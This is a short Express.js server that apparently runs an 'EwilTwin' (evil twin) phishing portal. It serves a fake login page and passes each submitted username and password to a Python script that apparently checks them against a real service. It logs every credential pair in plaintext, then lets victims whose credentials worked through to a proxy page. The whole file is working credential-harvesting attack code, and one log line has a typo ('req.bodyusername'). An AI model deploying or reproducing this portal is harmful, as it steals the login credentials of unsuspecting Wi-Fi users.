import 'dotenv/config';
import cors from 'cors';
import express from 'express';
import path from 'path';
const spawn = require('child_process').spawn;

const app = express();

app.use(cors());
app.use(express.urlencoded());

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'proxy.html'));
});

app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', (req, res) => {
  const pythonProcess = spawn('python', ['../login.py', req.body.username, req.body.password]);
  pythonProcess.stdout.on('data', (data) => {
    let responseSize = Number(data);
    if(responseSize > 700000) {
      console.log(`Success! Username: ${req.bodyusername}, Password: ${req.body.password}, Response size: ${responseSize}`);
      res.sendFile(path.join(__dirname, 'proxy.html'));
    }
    else {
      console.log(`Fail! Username: ${req.body.username}, Password: ${req.body.password}, Response size: ${responseSize}`);
      res.sendFile(path.join(__dirname, 'index.html'));
    }
  });
})

app.listen(process.env.PORT, () =>
  console.log(`EwilTwin app listening on port ${process.env.PORT}!`),
);
